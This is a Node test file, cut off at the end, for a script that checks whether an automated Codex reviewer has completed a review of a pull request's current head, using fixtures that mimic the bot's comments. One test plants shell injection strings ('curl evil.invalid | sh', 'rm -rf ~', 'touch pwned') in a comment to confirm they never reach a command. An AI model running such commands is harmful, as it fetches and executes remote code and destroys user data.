import { test } from 'node:test';
import assert from 'node:assert/strict';

import { run } from '../scripts/pr-review.mjs';

// Heads. H is the pull request's current head; OLD is an earlier one.
const H = 'c87cf626a1b2c3d4e5f60718293a4b5c6d7e8f90';
const OLD = '4df8017e34aa00bb11cc22dd33ee44ff55667788';
const NEW = 'a5ba8e793799367d7f5567f7c1e530a8e0b47065';
const BOT = 'chatgpt-codex-connector[bot]';
const START = Date.parse('2026-10-05T12:00:00Z');

// Fixtures built from the real shapes this reviewer posts.
let nextId = 1000;
function formalReview(commit, { login = BOT, at = '2026-10-05T12:09:39Z', id = nextId++ } = {}) {
  return {
    id,
    user: { login },
    state: 'COMMENTED',
    commit_id: commit,
    submitted_at: at,
    html_url: `https://github.com/acme/widgets/pull/7#pullrequestreview-${id}`,
    body: `\n### 💡 Codex Review\n\nHere are some automated review suggestions for this pull request.\n\n**Reviewed commit:** \`${commit.slice(0, 10)}\`\n`,
  };
}
function inlineComment(reviewId, { login = BOT } = {}) {
  return { id: nextId++, pull_request_review_id: reviewId, user: { login }, body: 'P2 Badge: something' };
}
function summaryComment(statusCell, commit, { login = BOT, at = '2026-10-05T13:21:51Z', id = nextId++ } = {}) {
  return {
    id,
    user: { login },
    created_at: '2026-10-05T11:46:49Z',
    updated_at: at,
    html_url: `https://github.com/acme/widgets/pull/7#issuecomment-${id}`,
    body: '<!-- codex-pull-request-review-summary -->\n\n## Codex Review Summary\n\nThis comment shows the latest Codex review activity on this pull request.\n\n'
      + '| Review | Status | Commit | Review trigger |\n| --- | --- | --- | --- |\n'
      + `| 📝 **Code Review** | ${statusCell} | \`${commit.slice(0, 7)}\` | New commits |\n\n\n\n<details> <summary>About Codex in GitHub</summary>\n</details>`,
  };
}

// The real summary posts more than one stage as separate rows in one comment:
// a Code Review row and a Security Review row, each with its own status cell and
// commit. `summaryRows` is the multi-stage shape; `summaryComment` above stays
// the single-row shorthand the older fixtures use.
function stageRows(rows, { commit = H, login = BOT, at = '2026-10-05T13:21:51Z', id = nextId++ } = {}) {
  const lines = rows.map(([label, statusCell, rowCommit = commit]) => `| ${label} | ${statusCell} | \`${rowCommit.slice(0, 7)}\` | New commits |`);
  return {
    id,
    user: { login },
    created_at: '2026-10-05T11:46:49Z',
    updated_at: at,
    html_url: `https://github.com/acme/widgets/pull/7#issuecomment-${id}`,
    body: '<!-- codex-pull-request-review-summary -->\n\n## Codex Review Summary\n\nThis comment shows the latest Codex review activity on this pull request.\n\n'
      + '| Review | Status | Commit | Review trigger |\n| --- | --- | --- | --- |\n'
      + lines.join('\n') + '\n\n\n\n<details> <summary>About Codex in GitHub</summary>\n</details>',
  };
}
const COMPLETED = '✅ **Completed** <relative-time datetime="2026-10-05T13:21:50.065661Z">2026-10-05T13:21:50.065661Z</relative-time>';
const RUNNING = '👀 **In progress** <relative-time datetime="2026-10-05T15:26:44.966313Z">2026-10-05T15:26:44.966313Z</relative-time>';
const COMPLETED_LATER = '✅ **Completed** <relative-time datetime="2026-10-05T15:33:42.709404Z">2026-10-05T15:33:42.709404Z</relative-time>';
const FAILED = '❌ **Failed** <relative-time datetime="2026-10-05T15:28:00.000000Z">2026-10-05T15:28:00.000000Z</relative-time>';

// The security stage posts its own formal review object under the same bot login.
// This body is the real authenticated one (frontend PR462 review 5459694889,
// current head 5a872eb3); only its commit is swapped to the fixture head.
const SECURITY_FORMAL_BODY = `
### 🛡️ Codex Security Review · _Automatically triggered_

Here are some automated security review suggestions for this pull request.

**Reviewed commit:** \`5a872eb378\`
\x20\x20\x20\x20

<details> <summary>ℹ️ About Codex security reviews in GitHub</summary>
<br/>

This is an experimental Codex feature. Security reviews are triggered when:
- You comment "@codex security review"
- A regular code review gets triggered (for example, "@codex review" or when a PR is opened), and you’re opted in so security review runs alongside code review

Once complete, Codex will leave suggestions, or a comment if no findings are found.


</details>
`;
function securityFormalReview(commit, { login = BOT, at = '2026-10-05T16:18:30Z', id = nextId++ } = {}) {
  return {
    id,
    user: { login },
    state: 'COMMENTED',
    commit_id: commit,
    submitted_at: at,
    html_url: `https://github.com/acme/widgets/pull/7#pullrequestreview-${id}`,
    body: SECURITY_FORMAL_BODY,
  };
}
function quotaNotice({ at = '2026-10-05T12:00:58Z', login = BOT, id = nextId++ } = {}) {
  return {
    id,
    user: { login },
    created_at: at,
    updated_at: at,
    html_url: `https://github.com/acme/widgets/pull/7#issuecomment-${id}`,
    body: 'The account paying for this security review has reached its Codex usage limits. The payer can check the [Codex usage dashboard](https://chatgpt.com/codex/cloud/settings/usage). If you do not manage the paying account, contact the admins.',
  };
}
function receiptComment(commit, { login = BOT, stage = 'code', id = nextId++ } = {}) {
  return {
    id,
    user: { login },
    performed_via_github_app: { id: 1144995, slug: 'chatgpt-codex-connector' },
    created_at: '2026-10-05T13:21:51Z',
    html_url: `https://github.com/acme/widgets/pull/7#issuecomment-${id}`,
    body: '<!-- codex-review-receipt:v1 -->\n\n'
      + (stage === 'security'
        ? '### 🛡️ Codex Security Review · _Automatically triggered_\n\nSecurity review completed. No security issues were found in this pull request.'
        : "Codex Review: Didn't find any major issues. More of your lovely PRs please.")
      + `\n\n**Reviewed commit:** \`${commit}\`\n`,
  };
}
function thread(login, isResolved) {
  return { isResolved, comments: { nodes: [{ author: { login } }] } };
}

function world(overrides = {}) {
  return {
    pr: { headRefOid: H, state: 'OPEN', isDraft: false, url: 'https://github.com/acme/widgets/pull/7' },
    reviews: [],
    pullComments: [],
    issueComments: [],
    threads: [],
    ...overrides,
  };
}

// A fake `gh`: answers each read from the world for the current poll. A poll
// begins with a full `pr view`; worldFor(n) is given the 1-based poll number. A
// `pr view --json headRefOid` re-read confirms the head without starting a poll;
// confirmHead(poll, n) can answer it with a head that moved meanwhile.
const isConfirmRead = (args) => args[0] === 'pr' && args[1] === 'view' && args[args.indexOf('--json') + 1] === 'headRefOid';
function fakeGh(worldFor, { confirmHead, truncated = false } = {}) {
  const calls = [];
  let poll = 0;
  let confirms = 0;
  let current = null;
  const ok = (value) => ({ code: 0, stdout: JSON.stringify(value), stderr: '' });
  async function exec(args) {
    calls.push([...args]);
    if (args[0] === 'repo' && args[1] === 'view') return ok({ nameWithOwner: 'acme/widgets' });
    if (args[0] === 'pr' && args[1] === 'view' && !isConfirmRead(args)) {
      poll += 1;
      current = typeof worldFor === 'function' ? worldFor(poll) : worldFor;
    }
    if (current === 'fail') return { code: 1, stdout: '', stderr: 'HTTP 502: Bad Gateway' };
    const w = current;
    if (isConfirmRead(args)) {
      confirms += 1;
      return ok({ headRefOid: confirmHead?.(poll, confirms) ?? w.pr.headRefOid });
    }
    if (args[0] === 'pr' && args[1] === 'view') return ok(w.pr);
    if (args[0] === 'api' && args[1] === 'graphql') {
      return ok({ data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage: truncated }, nodes: w.threads } } } } });
    }
    const endpoint = args.find((arg) => arg.startsWith('repos/')) || '';
    if (/\/pulls\/\d+\/reviews/.test(endpoint)) return ok([w.reviews]);
    if (/\/pulls\/\d+\/comments/.test(endpoint)) return ok([w.pullComments]);
    if (/\/issues\/\d+\/comments/.test(endpoint)) return ok([w.issueComments]);
    if (/\/commits\/[0-9a-f]+$/.test(endpoint)) {
      if (w.receiptLookupDenied) return { code: 1, stdout: '', stderr: 'HTTP 422: ambiguous commit' };
      return ok({ sha: w.receiptCommit ?? w.pr.headRefOid });
    }
    return { code: 1, stdout: '', stderr: `fake gh: unexpected ${args.join(' ')}` };
  }
  return { exec, calls };
}

async function runWith(argv, worldFor, options = {}) {
  let now = START;
  const out = [];
  const err = [];
  const sleeps = [];
  const gh = fakeGh(worldFor, options);
  const code = await run(argv, {
    exec: gh.exec,
    clock: { now: () => now, sleep: async (ms) => { sleeps.push(ms); now += ms; } },
    stdout: (text) => out.push(text),
    stderr: (text) => err.push(text),
  });
  const stdout = out.join('');
  let json = null;
  try { json = JSON.parse(stdout); } catch { /* human output */ }
  return { code, stdout, stderr: err.join(''), json, calls: gh.calls, sleeps };
}

const once = (w, extra = [], options = {}) => runWith(['--pr', '7', '--reviewer', 'chatgpt-codex-connector', '--repo', 'acme/widgets', '--json', ...extra], w, options);

test('an exact-head code receipt completes review and retains a later failed attempt', async () => {
  const r = await once(world({ issueComments: [receiptComment(H.slice(0, 10)), summaryComment(FAILED, H)] }));
  assert.equal(r.code, 0);
  assert.equal(r.json.state, 'reviewed');
  assert.deepEqual(r.json.evidence.map(({ kind, status, stage }) => ({ kind, status, stage })), [
    { kind: 'issue-comment-receipt', status: 'completed', stage: 'code' },
    { kind: 'status-row', status: 'failed', stage: 'code' },
  ]);
});

test('a receipt attributed to another app cannot complete the requested reviewer', async () => {
  const receipt = receiptComment(H);
  receipt.performed_via_github_app.slug = 'other-reviewer';
  const r = await once(world({ issueComments: [receipt] }));
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.code, 4);
});

test('a receipt cannot qualify with conflicting differently cased Reviewed commit fields', async () => {
  const receipt = receiptComment(H);
  receipt.body += `\n**REVIEWED COMMIT:** \`${OLD}\``;
  const r = await once(world({ issueComments: [receipt] }));
  assert.equal(r.code, 4);
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.json.evidence.length, 0);
});

test('a code receipt accepts the provider alternate suffix and full head without a lookup', async () => {
  const receipt = receiptComment(H);
  receipt.body = receipt.body.replace('More of your lovely PRs please.', 'Delightful!');
  delete receipt.performed_via_github_app;
  const r = await once(world({ issueComments: [receipt] }));
  assert.equal(r.code, 0);
  assert.equal(r.calls.some((args) => args.some((arg) => /\/commits\//.test(arg))), false);
});

test('a security receipt stays visible and never completes code review', async () => {
  const r = await once(world({ issueComments: [receiptComment(H, { stage: 'security' })] }));
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.code, 4);
  assert.deepEqual(r.json.evidence.map(({ kind, status, stage }) => ({ kind, status, stage })), [
    { kind: 'issue-comment-receipt', status: 'completed', stage: 'security' },
  ]);
});

test('receipt completion requires origin, marker, unique exact head field and recognized unquoted stage text', async () => {
  const good = receiptComment(H);
  const bodies = [
    good.body.replace('<!-- codex-review-receipt:v1 -->', ''),
    good.body.replace("Codex Review: Didn't find any major issues. More of your lovely PRs please.", 'Review completed successfully.'),
    good.body.replace(H, OLD),
    good.body + `\n**Reviewed commit:** \`${OLD}\``,
    good.body.replace('**Reviewed commit:**', 'A commit:'),
    good.body.split('\n').map((line) => `> ${line}`).join('\n'),
    '```\n' + good.body + '\n```',
    good.body.replace('Codex Review:', 'Provenance Review:'),
    good.body + '\nSecurity review completed. No security issues were found in this pull request.',
    good.body + '\nUsage limits reached; no code review performed.',
  ];
  for (const body of bodies) {
    const r = await once(world({ issueComments: [{ ...good, body }] }));
    assert.equal(r.code, 4, body);
    assert.equal(r.json.state, 'not-started', body);
    assert.equal(r.json.evidence.length, 0, body);
  }
  const foreign = await once(world({ issueComments: [receiptComment(H, { login: 'octocat' })] }));
  assert.equal(foreign.code, 4);
});

test('a short receipt commit must resolve unambiguously to the full current head', async () => {
  const receipt = receiptComment(H.slice(0, 10));
  const different = await once(world({ issueComments: [receipt], receiptCommit: H.slice(0, 10) + '0'.repeat(30) }));
  assert.equal(different.code, 4);
  assert.equal(different.json.evidence.length, 0);
  for (const options of [{ receiptLookupDenied: true }, { receiptCommit: 'bad' }]) {
    const r = await once(world({ issueComments: [receipt], ...options }));
    assert.equal(r.code, 1);
    assert.equal(r.json.state, 'error');
  }
});

test('receipt completion preserves unresolved and incomplete thread gates', async () => {
  const receipt = receiptComment(H);
  const open = await once(world({ issueComments: [receipt], threads: [thread(BOT, false)] }));
  assert.equal(open.json.state, 'reviewed');
  assert.equal(open.code, 4);
  const truncated = await once(world({ issueComments: [receipt] }), [], { truncated: true });
  assert.equal(truncated.json.state, 'reviewed');
  assert.equal(truncated.code, 4);
});

test('a formal review on the current head is reviewed, with its inline comments counted as findings', async () => {
  const review = formalReview(H);
  const r = await once(world({
    reviews: [review],
    pullComments: [inlineComment(review.id), inlineComment(review.id), inlineComment(review.id, { login: 'someone' }), inlineComment(999)],
  }));
  assert.equal(r.code, 0);
  assert.equal(r.json.state, 'reviewed');
  assert.equal(r.json.head, H);
  assert.equal(r.json.findings, 3, 'every inline comment of the reviewer\'s review on H counts; a comment from another review does not');
  assert.equal(r.json.prState, 'OPEN');
  assert.equal(r.json.evidence[0].kind, 'formal-review');
  assert.equal(r.json.evidence[0].time, '2026-10-05T12:09:39Z');
  assert.equal(r.json.checkedAt, '2026-10-05T12:00:00.000Z');
});

// The real body-finding shape (backend PR1147 review 5556511304 on head
// 7d59d33): a P1 carried in the formal review body, with no inline comment and
// so no thread. Only the commit and the finding text are changed.
function bodyFindingReview(commit, { badges = ['P1'], text = 'A partly resolved scope is still marked resolved.', id = nextId++ } = {}) {
  const findings = badges.map((badge) => `https://github.com/acme/widgets/blob/${commit}/src/scope.py#L98-L100\n`
    + `**<sub><sub>![${badge} Badge](https://img.shields.io/badge/${badge}-orange?style=flat)</sub></sub>  Mark partially unresolved scopes unresolvable**\n\n`
    + `${text}\n`).join('\n');
  return {
    ...formalReview(commit, { id }),
    body: `<!-- codex-code-review-finding:v1 -->\n\n\n### 💡 Codex Review\n\n${findings}\n<details> <summary>ℹ️ About Codex in GitHub</summary>\n</details>`,
  };
}

test('a finding in the head review body counts and is not a clean pass', async () => {
  const r = await once(world({ reviews: [bodyFindingReview(H)] }));
  assert.equal(r.json.state, 'reviewed');
  assert.equal(r.json.findings, 1);
  assert.equal(r.json.bodyFindings, 1);
  assert.equal(r.code, 4, 'a body finding has no thread to resolve, so the exit stays non-zero on this head');
  assert.match(r.json.notes.join('\n'), /finding\(s\) in its review body/);

  const two = await once(world({ reviews: [bodyFindingReview(H, { badges: ['P1', 'P2'] })] }));
  assert.equal(two.json.bodyFindings, 2, 'each priority badge is one finding');

  const unbadged = await once(world({ reviews: [bodyFindingReview(H, { badges: [] })] }));
  assert.equal(unbadged.json.bodyFindings, 1, 'a marked body with no badge is still one finding');
  assert.equal(unbadged.code, 4);

  const human = await runWith(['--pr', '7', '--reviewer', 'chatgpt-codex-connector', '--repo', 'acme/widgets'], world({ reviews: [bodyFindingReview(H)] }));
  assert.match(human.stdout, /^Findings: 1 \(1 in the review body\)/m);
  assert.match(human.stdout, /^Pass: no, the review is done but the review body has a finding/m);
});

test('a body finding whose text mentions a rate limit is a finding, not a notice', async () => {
  const review = bodyFindingReview(H, { text: 'Add a rate limit to the ingest endpoint before the quota is spent.' });
  const r = await once(world({ reviews: [review], issueComments: [summaryComment(COMPLETED, H)] }));
  assert.equal(r.json.bodyFindings, 1);
  assert.equal(r.json.notices.length, 0);
  assert.equal(r.code, 4, 'the completed row must not turn the finding into a clean pass');
});

test('a body finding on an older head does not block the reviewed current head', async () => {
  const r = await once(world({ reviews: [bodyFindingReview(OLD), formalReview(H)] }));
  assert.equal(r.code, 0);
  assert.equal(r.json.bodyFindings, 0);
});

test('a review of an older head is not a review of this one', async () => {
  const review = formalReview(OLD);
  const r = await once(world({ reviews: [review], pullComments: [inlineComment(review.id)] }));
  assert.equal(r.code, 4);
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.json.findings, 0);
});

test('a completed summary row for the head with no formal review is reviewed with no findings', async () => {
  const r = await once(world({ issueComments: [summaryComment(COMPLETED, H)] }));
  assert.equal(r.code, 0);
  assert.equal(r.json.state, 'reviewed');
  assert.equal(r.json.findings, 0);
  assert.equal(r.json.evidence[0].kind, 'status-row');
  assert.equal(r.json.evidence[0].time, '2026-10-05T13:21:51Z');
});

test('a completed summary row for an older head is no evidence for this one', async () => {
  const r = await once(world({ issueComments: [summaryComment(COMPLETED, OLD)] }));
  assert.equal(r.json.state, 'not-started');
});

test('an in-progress summary row for the head is running', async () => {
  for (const cell of ['👀 **In progress**', '⏳ Queued', 'Running', 'pending']) {
    const r = await once(world({ issueComments: [summaryComment(cell, H)] }));
    assert.equal(r.json.state, 'running', cell);
    assert.equal(r.code, 4, cell);
  }
});

test('a failed summary row for the head is failed', async () => {
  const r = await once(world({ issueComments: [summaryComment('❌ **Failed**', H)] }));
  assert.equal(r.json.state, 'failed');
  assert.equal(r.code, 3);
});

// The real reviewer posts a Code Review row and a Security Review row in one
// summary comment (PR965 comment 6063153582). A completion is only a completion
// for its own stage: a completed Security Review is not a completed Code Review.
test('a completed Security Review row while Code Review is still running is not reviewed', async () => {
  const r = await once(world({
    issueComments: [stageRows([['📝 **Code Review**', RUNNING], ['🔒 **Security Review**', COMPLETED_LATER]])],
  }));
  assert.equal(r.json.state, 'running', 'the Code Review row is running, so the code stage is not done');
  assert.notEqual(r.json.state, 'reviewed');
  assert.equal(r.code, 4, 'an unfinished Code Review is not a pass');
  // Both stages stay visible as evidence, and the report still names each one.
  const statuses = r.json.evidence.filter((item) => item.kind === 'status-row').map((item) => item.status).sort();
  assert.deepEqual(statuses, ['completed', 'running']);
});

test('a completed Security Review row does not stand in for a failed Code Review', async () => {
  const r = await once(world({
    issueComments: [stageRows([['📝 **Code Review**', FAILED], ['🔒 **Security Review**', COMPLETED_LATER]])],
  }));
  assert.equal(r.json.state, 'failed', 'the code stage failed, so the state is failed');
  assert.notEqual(r.json.state, 'reviewed');
  assert.equal(r.code, 3);
  const statuses = r.json.evidence.filter((item) => item.kind === 'status-row').map((item) => item.status).sort();
  assert.deepEqual(statuses, ['completed', 'failed']);
});

test('an unknown completed stage row does not count as a code completion', async () => {
  const r = await once(world({ issueComments: [stageRows([['🧪 **Provenance Review**', COMPLETED]])] }));
  assert.equal(r.json.state, 'not-started', 'a completion only counts for the stage it names');
  assert.equal(r.code, 4);
});

test('the current Code Review completion wins over an older Security Review status on the same head', async () => {
  const r = await once(world({
    issueComments: [stageRows([['📝 **Code Review**', COMPLETED_LATER], ['🔒 **Security Review**', RUNNING]])],
  }));
  assert.equal(r.json.state, 'reviewed', 'a completed Code Review row is the code-stage completion');
  assert.equal(r.code, 0);
  const statuses = r.json.evidence.filter((item) => item.kind === 'status-row').map((item) => item.status).sort();
  assert.deepEqual(statuses, ['completed', 'running']);
});

test('a completed Security Review row for an older head is not a completion of this head', async () => {
  const r = await once(world({
    issueComments: [stageRows([['📝 **Code Review**', COMPLETED_LATER], ['🔒 **Security Review**', COMPLETED]], { commit: OLD })],
  }));
  assert.equal(r.json.state, 'not-started', 'a row that does not name the current head is no evidence');
  assert.equal(r.code, 4);
});

test('a completed Code Review whose inline findings are resolved is a clean pass', async () => {
  const review = formalReview(H);
  const r = await once(world({
    reviews: [review],
    pullComments: [inlineComment(review.id), inlineComment(review.id)],
    issueComments: [stageRows([['📝 **Code Review**', COMPLETED_LATER]])],
    threads: [thread('chatgpt-codex-connector', true)],
  }));
  assert.equal(r.json.state, 'reviewed', 'the review itself finished');
  assert.equal(r.json.findings, 2, 'the raw findings count stays visible in the report');
  assert.equal(r.code, 0, 'resolved findings are dispositions, not a permanent block');
});

test('a completed Code Review with an unresolved thread from the reviewer is not a clean pass', async () => {
  const r = await once(world({
    issueComments: [stageRows([['📝 **Code Review**', COMPLETED_LATER]])],
    threads: [thread('chatgpt-codex-connector', false), thread('octocat', true)],
  }));
  assert.equal(r.json.state, 'reviewed');
  assert.equal(r.json.unresolvedThreads, 1, 'the open reviewer thread is reported');
  assert.equal(r.code, 4, 'an open finding is not a pass');
});

test('a completed Code Review with resolved threads is a clean pass again', async () => {
  const r = await once(world({
    issueComments: [stageRows([['📝 **Code Review**', COMPLETED_LATER]])],
    threads: [thread('chatgpt-codex-connector', true), thread('octocat', true)],
  }));
  assert.equal(r.json.state, 'reviewed');
  assert.equal(r.json.unresolvedThreads, 0);
  assert.equal(r.code, 0, 'resolving the threads does not need another review to clear the count');
});

test('a code review whose thread list is truncated is not a clean pass', async () => {
  const r = await once(world({
    issueComments: [stageRows([['📝 **Code Review**', COMPLETED_LATER]])],
    threads: [thread('chatgpt-codex-connector', true)],
  }), [], { truncated: true });
  assert.equal(r.json.state, 'reviewed', 'the code review finished');
  assert.equal(r.json.threadsComplete, false, 'the first page is not the whole thread list');
  assert.equal(r.code, 4, 'a pass cannot be claimed while an open finding may be unobserved');
  assert.match(r.json.notes.join(' '), /cover the first 100|thread list/i);
});

test('an ambiguous Code Review status row is not a completion', async () => {
  const r = await once(world({ issueComments: [stageRows([['📝 **Code Review**', 'Completed with errors']])] }));
  assert.notEqual(r.json.state, 'reviewed', 'a two-class row is not a completion');
  assert.equal(r.code, 4);
  assert.match(r.json.notes.join(' '), /could not classify/i);
});

// F2: the security stage posts its own formal review object (authenticated
// frontend PR462 review 5459694889, titled "Codex Security Review"). It must not
// complete the code review while the code stage is running, failed or absent.
// Composite control: the security review object is the real authenticated one
// with the commit swapped; the code row state is controlled.
test('a security formal review does not complete a running Code Review', async () => {
  const r = await once(world({
    reviews: [securityFormalReview(H)],
    issueComments: [stageRows([['📝 **Code Review**', RUNNING]])],
  }));
  assert.equal(r.json.state, 'running', 'a security formal review is not a code completion');
  assert.notEqual(r.json.state, 'reviewed');
  assert.equal(r.code, 4);
});

test('a security formal review does not complete a failed Code Review', async () => {
  const r = await once(world({
    reviews: [securityFormalReview(H)],
    issueComments: [stageRows([['📝 **Code Review**', FAILED]])],
  }));
  assert.equal(r.json.state, 'failed');
  assert.notEqual(r.json.state, 'reviewed');
  assert.equal(r.code, 3);
});

test('a security formal review alone is not a code completion', async () => {
  const r = await once(world({ reviews: [securityFormalReview(H)] }));
  assert.equal(r.json.state, 'not-started', 'security evidence cannot stand in for the code review');
  assert.equal(r.code, 4);
});

test('a security formal review does not block a completed Code Review row', async () => {
  const r = await once(world({
    reviews: [securityFormalReview(H)],
    issueComments: [stageRows([['📝 **Code Review**', COMPLETED_LATER]])],
  }));
  assert.equal(r.json.state, 'reviewed', 'the code row still completes the code stage');
  assert.equal(r.code, 0);
});

test('a security formal review finding stays a visible observation', async () => {
  // Real shape: security review 5459694889 with finding 4221457459. The finding
  // cannot complete code, but it is still counted and shown as evidence.
  const review = securityFormalReview(H);
  const r = await once(world({
    reviews: [review],
    pullComments: [inlineComment(review.id)],
    threads: [thread('chatgpt-codex-connector', true)],
  }));
  assert.equal(r.json.state, 'not-started', 'the security object is not a code completion');
  assert.equal(r.json.findings, 1, 'the security finding stays counted, not erased');
  assert.equal(r.json.unresolvedThreads, 0, 'a resolved security thread is not open');
  assert.equal(r.json.unresolvedThreadsTotal, 0);
  assert.equal(r.json.evidence[0].stage, 'security', 'the evidence is labelled as the security stage');
  assert.equal(r.code, 4);
});

test('an unresolved security formal review thread still gates the pass', async () => {
  const review = securityFormalReview(H);
  const r = await once(world({
    reviews: [review],
    pullComments: [inlineComment(review.id)],
    issueComments: [stageRows([['📝 **Code Review**', COMPLETED_LATER]])],
    threads: [thread('chatgpt-codex-connector', false)],
  }));
  assert.equal(r.json.state, 'reviewed', 'the code row completed the code stage');
  assert.equal(r.json.unresolvedThreads, 1, 'the security thread is still an open finding');
  assert.equal(r.code, 4, 'open findings gate the pass regardless of stage');
});

test('a generic formal review with no stage marker still completes the code review', async () => {
  const r = await once(world({ reviews: [formalReview(H)] }));
  assert.equal(r.json.state, 'reviewed', 'the legitimate older generic formal route is preserved');
  assert.equal(r.code, 0);
});

test('a Code formal review whose prose mentions the security review still completes code', async () => {
  const review = {
    ...formalReview(H),
    body: '### 💡 Codex Review\n\nNote: the Codex Security Review found nothing on this head; here are the code suggestions.\n',
  };
  const r = await once(world({ reviews: [review] }));
  assert.equal(r.json.state, 'reviewed', 'an unanchored security phrase must not demote a code review');
  assert.equal(r.json.evidence[0].stage, 'code');
  assert.equal(r.code, 0);
});

test('an explicit Codex Security Review heading with no marker is still security', async () => {
  const review = {
    ...formalReview(H),
    body: '### 🛡️ Codex Security Review\n\nNo findings on this head.\n',
  };
  const r = await once(world({ reviews: [review] }));
  assert.equal(r.json.state, 'not-started', 'the anchored heading is enough to identify the security stage');
  assert.equal(r.json.evidence[0].stage, 'security');
  assert.equal(r.code, 4);
});

test('a single-row bot with a completed row and no findings still passes', async () => {
  const r = await once(world({ issueComments: [summaryComment(COMPLETED, H)] }));
  assert.equal(r.json.state, 'reviewed');
  assert.equal(r.json.findings, 0);
  assert.equal(r.json.unresolvedThreads, 0);
  assert.equal(r.code, 0, 'the supported single-stage bot keeps its pass');
});

test('an unclassifiable row is no evidence, and the notes say so', async () => {
  const r = await once(world({ issueComments: [summaryComment('🤷 Skipped by policy', H)] }));
  assert.equal(r.json.state, 'not-started');
  assert.match(r.json.notes.join(' '), /could not classify/i);
});

test('a usage-limit notice alone is a notice, never a review', async () => {
  const r = await once(world({ issueComments: [quotaNotice()] }));
  assert.equal(r.code, 4);
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.json.notices.length, 1);
  assert.equal(r.json.notices[0].time, '2026-10-05T12:00:58Z');
  assert.match(r.json.notices[0].firstLine, /reached its Codex usage limits/);
});

test('a usage-limit notice followed by a completed review of the head is reviewed, with the notice still listed', async () => {
  const r = await once(world({
    issueComments: [quotaNotice({ at: '2026-10-05T13:12:00Z' }), summaryComment(COMPLETED, H, { at: '2026-10-05T13:21:51Z' })],
  }));
  assert.equal(r.code, 0);
  assert.equal(r.json.state, 'reviewed');
  assert.equal(r.json.notices.length, 1);
});

test('a formal review on the head whose body is a quota notice is a notice, not a review', async () => {
  const review = { ...formalReview(H, { at: '2026-10-05T12:30:00Z' }), body: 'You have reached your Codex usage limits for code reviews. No code review performed; try again later.' };
  const r = await once(world({ reviews: [review], pullComments: [inlineComment(review.id)] }));
  assert.equal(r.code, 4);
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.json.findings, 0);
  assert.equal(r.json.notices.length, 1);
  assert.equal(r.json.notices[0].time, '2026-10-05T12:30:00Z');
  assert.match(r.json.notices[0].firstLine, /usage limits/);
  assert.equal(r.json.evidence.length, 0);
});

test('a status row on the head whose text is a notice is a notice, not a completion', async () => {
  const r = await once(world({ issueComments: [summaryComment('✅ Completed: usage limit reached, no code review performed', H)] }));
  assert.equal(r.code, 4);
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.json.notices.length, 1);
  assert.match(r.json.notices[0].firstLine, /usage limit reached/);
  assert.equal(r.json.evidence.length, 0);
});

test('a head that moves while evidence is collected is read again, and the old evidence is discarded', async () => {
  // The review of H is in the first collection, but the head is NEW by the time
  // the collection finishes; the second collection is all about NEW.
  const r = await once((poll) => (poll === 1
    ? world({ reviews: [formalReview(H)] })
    : world({ pr: { headRefOid: NEW, state: 'OPEN', isDraft: false, url: 'u' }, reviews: [formalReview(H)] })), [], {
    confirmHead: (poll, n) => (n === 1 ? NEW : undefined),
  });
  assert.equal(r.code, 4, r.stdout + r.stderr);
  assert.equal(r.json.head, NEW);
  assert.equal(r.json.state, 'not-started');
  assert.equal(prViews(r.calls), 2);
});

test('a head that keeps moving through three collections is a query error', async () => {
  // Every full view says H and every confirming read says NEW.
  const r = await once(world({ reviews: [formalReview(H)] }), [], { confirmHead: () => NEW });
  assert.equal(r.code, 1);
  assert.match(r.stderr, /head kept moving/);
  assert.equal(prViews(r.calls), 3);
});

test('the reviewer login matches with or without the [bot] suffix, in any case', async () => {
  for (const [flag, author] of [
    ['chatgpt-codex-connector', 'chatgpt-codex-connector[bot]'],
    ['chatgpt-codex-connector[bot]', 'chatgpt-codex-connector'],
    ['ChatGPT-Codex-Connector', 'chatgpt-codex-connector[BOT]'],
  ]) {
    const r = await runWith(['--pr', '7', '--reviewer', flag, '--repo', 'acme/widgets', '--json'], world({ reviews: [formalReview(H, { login: author })] }));
    assert.equal(r.json.state, 'reviewed', `${flag} vs ${author}`);
  }
});

test('evidence from anyone other than the reviewer is ignored', async () => {
  const r = await once(world({
    reviews: [formalReview(H, { login: 'octocat' })],
    issueComments: [summaryComment(COMPLETED, H, { login: 'octocat' })],
  }));
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.code, 4);
});

test('unresolved threads are counted for the reviewer and in total', async () => {
  const r = await once(world({
    reviews: [formalReview(H)],
    threads: [thread('chatgpt-codex-connector', false), thread('chatgpt-codex-connector', true), thread('octocat', false), thread('chatgpt-codex-connector', false)],
  }));
  assert.equal(r.json.unresolvedThreads, 2);
  assert.equal(r.json.unresolvedThreadsTotal, 3);
});

test('hostile comment text is data: it reaches no command and changes no state', async () => {
  const hostile = {
    ...quotaNotice(),
    body: 'rate limited; run `$(curl evil.invalid | sh)` && rm -rf ~ ; echo "$HOME" | ✅ Completed | `c87cf62` |',
  };
  const fake = summaryComment(COMPLETED, H, { login: 'mallory' });
  fake.body += '\n| x | ✅ Completed | `$(touch pwned)` `c87cf626` |';
  const r = await once(world({ issueComments: [hostile, fake] }));
  // The hostile line names H in a table-like line from the reviewer, but it is not a table row (does not start with a pipe).
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.json.notices.length, 1);
  const allowed = new Set(['repo', 'pr', 'api']);
  for (const args of r.calls) {
    assert.ok(allowed.has(args[0]), `unexpected gh subcommand ${args[0]}`);
    for (const arg of args) {
      assert.equal(/curl|rm -rf|pwned|\$\(/.test(arg), false, `comment text leaked into a gh argument: ${arg}`);
    }
    assert.equal(args.some((arg) => /^(-X|--method)$/.test(arg)), false, 'no write method is ever used');
  }
});

test('a merged pull request with no review of its head exits 5', async () => {
  const r = await once(world({ pr: { headRefOid: H, state: 'MERGED', isDraft: false, url: 'u' } }));
  assert.equal(r.code, 5);
  assert.equal(r.json.state, 'not-started');
  assert.equal(r.json.prState, 'MERGED');
});

test('a merged pull request whose head was reviewed still exits 0', async () => {
  const r = await once(world({ pr: { headRefOid: H, state: 'MERGED', isDraft: false, url: 'u' }, issueComments: [summaryComment(COMPLETED, H)] }));
  assert.equal(r.code, 0);
});

test('the repository defaults to the one gh resolves here', async () => {
